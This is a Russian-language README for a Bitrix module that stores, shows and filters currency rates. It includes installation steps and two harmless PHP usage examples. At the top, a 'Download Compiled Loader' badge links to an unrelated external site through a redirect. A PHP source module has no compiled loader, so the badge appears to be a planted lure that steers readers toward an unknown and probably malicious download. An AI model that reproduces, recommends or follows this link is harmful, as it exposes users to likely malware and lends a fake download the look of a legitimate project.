# Модуль Курсов Валют (my.currency)

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Модуль предназначен для хранения, отображения и фильтрации курсов валют. 

## 🚀 Возможности
* ORM Сущность: Работа с БД через DataManager с проверкой уникальности поля CODE.
* Умная установка: При инсталляции создается таблица в БД, копируются компоненты и загружаются тестовые записи.
* Main.UI.Grid: Список валют поддерживает настройку колонок, сортировку и AJAX-режим.
* Main.UI.Filter: Позволяет фильтровать данные по диапазонам дат, курсов и частичному совпадению кода.
 
## 📦 Установка
1. Поместите модуль в папку my.currency в директорию /local/modules/.
2. Перейдите в административную панель: Marketplace -> Установленные решения.
3. Найдите в списке Курсы валют (my.currency) и нажмите Установить.

## 💻 Пример использования на странице
Для вывода фильтра и списка курсов на одной странице используйте следующий код. 
Обратите внимание, что GRID_ID должен быть одинаковым для связки компонентов.
```
<?php
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");

$APPLICATION->SetTitle("Мониторинг курсов валют");

// Уникальный ID для связки фильтра и таблицы
$gridId = "currency_list_grid";

// 1. Вывод фильтра
$APPLICATION->IncludeComponent(
    "my:currency.filter",
    "",
    [
        "GRID_ID" => $gridId
    ]
);

echo "<br>";

// 2. Вывод списка
$APPLICATION->IncludeComponent(
    "my:currency.list",
    "",
    [
        "GRID_ID" => $gridId,
        "PAGE_ELEMENT_COUNT" => 10 // Количество записей на странице
    ]
);

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
?>
```
## 📋 Программное добавление данных (API)
Вы можете добавлять новые курсы программно из любого места вашего проекта:
```
use My\Currency\CurrencyTable;
use Bitrix\Main\Loader;

if (Loader::includeModule('my.currency')) {
    CurrencyTable::add([
        'CODE' => 'JPY',
        'COURSE' => 0.59,
        'DATE' => new \Bitrix\Main\Type\DateTime()
    ]);
}
```
